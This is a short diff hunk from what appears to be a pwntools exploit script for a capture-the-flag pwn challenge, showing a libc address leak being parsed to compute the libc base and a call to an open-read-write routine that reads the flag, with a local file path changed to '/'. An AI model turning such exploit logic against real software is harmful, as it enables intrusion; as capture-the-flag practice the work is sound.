@@ -60,7 +60,7 @@ io1 = getio()
 # debug(io1)
 io1.recvuntil(b'gift:')
 libc_base = int(io1.recv(0xe),16) - 0x606f0
-OGW_ORW(io1, libc_base, gadgets, 'ogw', b'/mnt/d/PWN/2024-CBCTF/Pwn/ogw_orw/attachment/')
+OGW_ORW(io1, libc_base, gadgets, 'ogw', b'/')
 io1.recvuntil('flag')
 rand = io1.recvuntil('\x00')
 
